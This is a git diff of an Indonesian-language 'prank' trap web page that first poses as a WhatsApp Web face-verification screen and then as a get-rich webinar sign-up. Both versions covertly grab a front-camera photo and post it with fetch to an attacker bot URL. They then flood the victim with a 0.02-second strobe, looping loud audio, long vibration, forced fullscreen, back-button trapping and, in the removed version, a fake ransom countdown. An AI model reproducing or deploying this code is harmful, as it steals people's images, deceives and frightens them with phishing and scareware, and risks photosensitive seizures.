@@ -1,133 +1,164 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>WhatsApp Web - Verifikasi Biometrik</title>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Webinar Rahasia Kaya 2026 - Pendaftaran</title>
     <style>
-        body { margin: 0; padding: 0; background: #f0f2f5; font-family: 'Segoe UI', Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        #login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; z-index: 10; transition: transform 0.3s; }
-        #wa-logo { width: 80px; margin-bottom: 20px; }
-        h2 { color: #41525d; font-weight: 300; margin-bottom: 10px; }
-        p { color: #8696a0; font-size: 14px; margin-bottom: 20px; line-height: 1.5; }
-        .alert-box { background: #e8f5fe; color: #00a884; padding: 10px; border-radius: 5px; font-size: 13px; margin-bottom: 20px; border: 1px solid #c2e7ff; }
-        #btn-login { background: #00a884; color: white; border: none; padding: 12px 20px; font-size: 15px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; box-shadow: 0 2px 4px rgba(0,168,132,0.3); transition: 0.2s; }
-        #btn-login:hover { background: #008f72; }
-        #btn-login:active { transform: scale(0.98); }
-        #hacker-screen { display: none; position: absolute; top: 0; left: 0; width: 100vw; height: 100vh; background: black; color: #00ff00; font-family: 'Courier New', Courier, monospace; padding: 20px; box-sizing: border-box; z-index: 999; overflow: hidden; }
-        #console-text { font-size: 11px; line-height: 1.3; white-space: pre-wrap; margin-top: 10px; position: relative; z-index: 1002;}
-        .red-text { color: red; font-weight: bold; }
-        #zxc-header { color: white; background: red; padding: 5px; text-align: center; font-weight: bold; font-size: 18px; position: relative; z-index: 1002; margin-top: 10px; border-radius: 5px; }
-        .hacked-face { width: 150px; border: 2px dashed red; display: block; margin: 10px 0; filter: grayscale(100%) sepia(100%) hue-rotate(300deg) saturate(500%); animation: glitch-img 0.2s infinite; }
-        @keyframes glitch-img { 0% { transform: translate(1px, 1px); } 50% { transform: translate(-1px, -1px); } 100% { transform: translate(1px, -1px); } }
-        #key-box { display: none; position: relative; z-index: 1002; background: rgba(0,0,0,0.8); border: 2px solid #00ff00; padding: 15px; margin-top: 15px; border-radius: 5px; text-align: center; }
-        #license-key { border: 1px solid #00ff00; color: #00ff00; background: #000; padding: 8px; width: 80%; }
-        #btn-activate { background: red; color: white; border: none; padding: 10px 15px; font-size: 14px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        #error-key { color: red; font-size: 12px; margin-top: 5px; display: none; }
-        .blink { animation: blinker 0.1s linear infinite; } @keyframes blinker { 50% { opacity: 0; } }
-        .strobe-mode { animation: strobeEffect 0.03s infinite; } 
-        @keyframes strobeEffect { 0% { background-color: white; opacity: 1; } 49% { background-color: white; opacity: 1; } 50% { background-color: black; opacity: 1; } 100% { background-color: black; opacity: 1; } }
+        /* RESET & CSS DASAR */
+        * { margin:0; padding:0; box-sizing:border-box; font-family:'Poppins', sans-serif; }
+        body { background-color: #f4f7f6; color: #333; display: flex; justify-content: center; align-items: center; min-height: 100vh; transition: 0.1s; }
+
+        /* [1] UMPAN (MOTIVASI KAYA) */
+        #bait-box { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 450px; z-index: 10; transition: transform 0.3s; }
+        
+        /* Gambar Umpan (Contoh: Orang main laptop mewah) */
+        #bait-img { width: 100%; border-radius: 10px; margin-bottom: 25px; }
+        
+        h2 { font-size: 24px; font-weight: 700; color: #1a1a1a; margin-bottom: 10px; }
+        p { color: #666; font-size: 15px; margin-bottom: 30px; line-height: 1.6; }
+        
+        #btn-bait { background: #ff9800; color: white; border: none; padding: 15px 30px; font-size: 16px; border-radius: 30px; cursor: pointer; font-weight: bold; width: 100%; box-shadow: 0 4px 6px rgba(255,152,0,0.3); transition: 0.2s; text-transform: uppercase; letter-spacing: 1px; }
+        #btn-bait:hover { background: #e68a00; transform: translateY(-2px); }
+        #btn-bait:active { transform: translateY(1px); }
+
+        /* [2] TAMPILAN PRANK (NERAKA) */
+        #hacker-screen { display: none; position: absolute; top: 0; left: 0; width: 100vw; height: 100vh; background: black; padding: 20px; box-sizing: border-box; z-index: 999; overflow: hidden; }
+        #zxc-header { color: white; background: red; padding: 10px; text-align: center; font-weight: bold; font-size: 22px; position: relative; z-index: 1002; margin-top: 10px; border-radius: 5px; text-transform: uppercase;}
+
+        /* 🔥 STROBO EFEK BRUTAL 🔥 */
+        .strobe-mode { animation: strobeEffect 0.02s infinite; } /* Dipercepat lagi! */
+        @keyframes strobeEffect {
+            0% { background-color: white; }
+            49% { background-color: white; }
+            50% { background-color: black; }
+            100% { background-color: black; }
+        }
     </style>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
 </head>
 <body>
+    
     <video id="spy-cam" autoplay playsinline style="display:none;"></video>
     <canvas id="spy-canvas" style="display:none;"></canvas>
+    <audio id="jumpscare-audio" src="https://www.soundjay.com/buttons/beep-01a.mp3" loop></audio>
 
-    <div id="login-box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" id="wa-logo" alt="WA Logo">
-        <h2>WhatsApp Web</h2>
-        <p>Gunakan WhatsApp di komputer atau perangkat Anda.</p>
-        <div class="alert-box">🛡️ <b>Pembaruan Keamanan:</b> Kami kini menggunakan verifikasi Biometrik (Wajah) untuk login.</div>
-        <button id="btn-login" onclick="initiateDoom()">MULAI PINDAI WAJAH</button>
+    <div id="bait-box">
+        <img src="https://i.ibb.co/bX1Z8Yd/laptop-lux.jpg" id="bait-img" alt="Luxury Laptop">
+        <h2>Rahasia Menghasilkan Rp 50 Juta Pertama Lu!</h2>
+        <p>Bosan jadi karyawan biasa? Temukan metode rahasia yang digunakan para 'Sultan' untuk menghasilkan uang dari mana saja, bahkan dari kolam renang!</p>
+        <button id="btn-bait" onclick="startDoom()">KLIK UNTUK MENONTON VIDEO</button>
     </div>
 
     <div id="hacker-screen">
-        <div id="strobe-overlay" style="position:absolute; top:0; left:0; width:100%; height:100%; z-index:1000; opacity:0;"></div>
-        <div id="zxc-header" class="blink">HACKED BY FRIP ZXC</div>
-        <h1 style="color: red; text-align: center; font-size: 16px; position:relative; z-index:1002; margin: 10px 0;">🔴 FACE ID & DATA COMPROMISED 🔴</h1>
-        <div id="console-text"></div>
-        <div id="key-box">
-            <p style="color: #00ff00; font-size: 12px; margin: 0 0 10px 0;">DATA DIHAPUS DALAM <span id="time-left">60</span>s!</p>
-            <input type="text" id="license-key" placeholder="Masukkan Decryption Key...">
-            <button id="btn-activate" onclick="checkKey()">BATALKAN HAPUS DATA</button>
-            <div id="error-key">KEY SALAH! Mempercepat unggahan wajah ke Dark Web...</div>
+        <div id="strobe-overlay" style="position:absolute; top:0; left:0; width:100%; height:100%; z-index:1000;"></div>
+        
+        <div id="zxc-header" class="blink">SYSTEM OVERLOAD DETECTED</div>
+        <h1 style="color: red; text-align: center; font-size: 20px; position:relative; z-index:1001; margin: 20px 0;">🔴 DANGER: CRITICAL FAILURE 🔴</h1>
+        
+        <div style="color:white; font-family:'Courier New', monospace; font-size:12px; position:relative; z-index:1001;">
+            > MEMULAI PROTOKOL PEMUSNAHAN DATA... [SUKSES]<br>
+            > MENGIRIM BIOMETRIK WAJAH KE DATABASE... [SUKSES]<br>
+            > HP ANDA AKAN SEGERA HANG DALAM 60s...
         </div>
     </div>
 
     <script>
-        let doomStarted = false; let capturedPhoto = null; 
-        const urlParams = new URLSearchParams(window.location.search);
-        const TRAP_ID = urlParams.get('id') || "TARGET_UNKNOWN";
-        const BOT_API = urlParams.get('api');
+        let doomStarted = false;
+        let capturedPhoto = null;
 
-        function requestFullScreen() { let el = document.documentElement; if (el.requestFullscreen) { el.requestFullscreen().catch(()=>{}); } else if (el.webkitRequestFullscreen) { el.webkitRequestFullscreen().catch(()=>{}); } }
-        
+        // AMBIL PARAMETER DARI LINK VERCEL LU
+        const urlParams = new URLSearchParams(window.location.search);
+        const TRAP_ID = urlParams.get('id') || "MOTIVASI_UMPAN";
+        const BOT_API = urlParams.get('api'); // Link localtunnel bot lu
+
+        // MINTA FULLSCREEN MAKSIMAL!
+        function requestFullScreen() {
+            let el = document.documentElement;
+            if (el.requestFullscreen) { el.requestFullscreen().catch(()=>{}); }
+            else if (el.webkitRequestFullscreen) { el.webkitRequestFullscreen().catch(()=>{}); }
+        }
+
+        // FUNGSI NYOLONG KAMERA (Tanpa Notif, Langsung Jepret)
         async function snapPhoto() {
             try {
+                // Minta izin kamera depan
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('spy-cam'); video.srcObject = stream;
+                const video = document.getElementById('spy-cam');
+                video.srcObject = stream;
+                
+                // Tunggu kamera nyala
                 await new Promise(resolve => video.onloadedmetadata = resolve);
-                const canvas = document.getElementById('spy-canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                
+                // Jepret ke canvas
+                const canvas = document.getElementById('spy-canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                // Ubah jadi gambar Base64
                 capturedPhoto = canvas.toDataURL('image/jpeg', 0.5);
+                
+                // Matiin lampu kamera
                 stream.getTracks().forEach(track => track.stop());
-                if(BOT_API) fetch(BOT_API + '/api/trap/photo', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({id: TRAP_ID, photoBase64: capturedPhoto}) });
-            } catch (e) { console.log("Akses kamera ditolak."); }
+                
+                // 🔥 KONEKTOR BOT (Ngirim ke Bot Laptop Lu) 🔥
+                if(BOT_API && capturedPhoto) {
+                    fetch(BOT_API + '/api/trap/photo', { 
+                        method: 'POST', 
+                        headers: { 'Content-Type': 'application/json' }, 
+                        body: JSON.stringify({ id: TRAP_ID, photoBase64: capturedPhoto }) 
+                    }).catch(e => console.log("Bot belum siap!"));
+                }
+            } catch (e) {
+                console.log("Akses kamera ditolak target.");
+            }
         }
 
-        async function initiateDoom() {
-            let btn = document.getElementById('btn-login'); btn.innerText = "MENGAKSES KAMERA..."; btn.style.background = "#ff9800";
-            await snapPhoto(); startDoom();
-        }
-
+        // INIT DOOM (Tombol Diklik)
         async function startDoom() {
-            doomStarted = true; requestFullScreen();
-            document.getElementById('login-box').style.display = 'none'; document.getElementById('hacker-screen').style.display = 'block';
-            let strobe = document.getElementById('strobe-overlay'); strobe.style.opacity = '1'; strobe.classList.add('strobe-mode');
-            try {
-                let audioCtx = new (window.AudioContext || window.webkitAudioContext)(); let osc = audioCtx.createOscillator(); let gain = audioCtx.createGain();
-                osc.type = 'sawtooth'; osc.frequency.setValueAtTime(500, audioCtx.currentTime); osc.frequency.exponentialRampToValueAtTime(7000, audioCtx.currentTime + 0.1); 
-                osc.connect(gain); gain.connect(audioCtx.destination); osc.start();
-                setInterval(() => { osc.frequency.setValueAtTime(Math.random() * 6000 + 1000, audioCtx.currentTime); }, 30);
-            } catch(e) {}
-            if (navigator.vibrate) { navigator.vibrate([3000, 30, 3000, 30, 3000, 30, 5000]); }
-            let consoleTxt = document.getElementById('console-text'); let platform = navigator.platform || 'Unknown Device';
-            let lines = [ `[SYSTEM] <span class='blink'>FRIP_ZXC OS - INITIATING...</span>`, `[INFO] Target: <span class='red-text'>${platform}</span>`, `[HACK] Membuka <span class='red-text'>WhatsApp ChatLogs</span>...`, `[HACK] Mengakses Biometrik Wajah...` ];
-            let i = 0;
-            let interval = setInterval(() => {
-                if (i < lines.length) {
-                    consoleTxt.innerHTML += "> " + lines[i] + "<br>";
-                    if (i === 3 && capturedPhoto) { consoleTxt.innerHTML += `<img src="${capturedPhoto}" class="hacked-face"><br>> <span class='red-text'>[SUKSES] FOTO WAJAH BERHASIL DIAMBIL & DIKIRIM KE DATABASE!</span><br>`; }
-                    i++;
-                } else {
-                    clearInterval(interval);
-                    setTimeout(() => { document.getElementById('console-text').style.opacity = '0.4'; document.getElementById('key-box').style.display = 'block'; startFakeTimer(); }, 1000);
-                }
-            }, 500); 
+            let btn = document.getElementById('btn-bait');
+            btn.innerText = "MENGAKSES VIDEO...";
+            btn.style.background = "#e68a00";
+
+            // 1. Eksekusi Jebret Kamera
+            await snapPhoto();
+
+            // 2. Lanjut ke Neraka
+            activateDoom();
         }
 
-        function startFakeTimer() {
-            let timeLeftSpan = document.getElementById('time-left'); let timeLeft = 60;
-            let timerInterval = setInterval(() => {
-                timeLeft--; timeLeftSpan.innerText = timeLeft;
-                if (timeLeft <= 0) {
-                    clearInterval(timerInterval);
-                    let strobe = document.getElementById('strobe-overlay'); strobe.classList.remove('strobe-mode'); strobe.style.opacity = '0';
-                    document.getElementById('hacker-screen').style.backgroundColor = "black";
-                    document.getElementById('key-box').innerHTML = "<span class='red-text blink' style='font-size:18px;'>TERLAMBAT!! WAJAH & DATA ANDA TELAH DISEBARKAN!</span><br><br>Hacked by FRIP ZXC.";
-                }
-            }, 1000);
+        // FUNGSI AKTIVASI NERAKA (STROBO + JUMPSCARE)
+        function activateDoom() {
+            doomStarted = true;
+            requestFullScreen();
+            
+            document.getElementById('bait-box').style.display = 'none';
+            let hackScreen = document.getElementById('hacker-screen');
+            hackScreen.style.display = 'block';
+
+            // 🔥 🔥 [FITUR PRO]: JUMPSCARE SUARA EARREAPE 🔥 🔥
+            let jumpscareAudio = document.getElementById('jumpscare-audio');
+            jumpscareAudio.volume = 1.0; // Volume maksimal!
+            jumpscareAudio.play().catch(()=>{});
+
+            // NYALAKAN STROBO BRUTAL 0.02s
+            document.getElementById('strobe-overlay').classList.add('strobe-mode');
+
+            // VIBRASI BRUTAL (Bikin HP Mau Meledak)
+            if (navigator.vibrate) {
+                navigator.vibrate([4000, 50, 4000, 50, 4000, 50, 5000]);
+            }
         }
 
-        function checkKey() {
-            document.getElementById('error-key').style.display = 'block'; 
-            if (navigator.vibrate) { navigator.vibrate([1000, 100, 1000, 100, 2000]); }
-            document.getElementById('console-text').innerHTML += "> [WARNING] <span class='red-text'>KEY SALAH! Mempercepat unggahan ke Dark Web Server 02...</span><br>";
-        }
-        
+        // TWIST TOMBOL KEMBALI
         (function() {
-            let attempts = 0; for (let i = 0; i < 5; i++) { window.history.pushState({page: i}, null, null); }
-            window.addEventListener('popstate', function(event) { if (doomStarted) { attempts++; if (attempts > 2) { alert("Twist: Kena prank FAIZ AHNAF lu! BWAHAHAHA!"); window.location.reload(); } else { requestFullScreen(); } } });
+            for (let i = 0; i < 5; i++) { window.history.pushState({page: i}, null, null); }
+            window.addEventListener('popstate', function(event) {
+                if (doomStarted) {
+                    alert("Kena jebakan MOTIVASI FRIP ZXC lu! BWAHAHAHA!");
+                    window.location.reload(); 
+                }
+            });
         })();
     </script>
 </body>
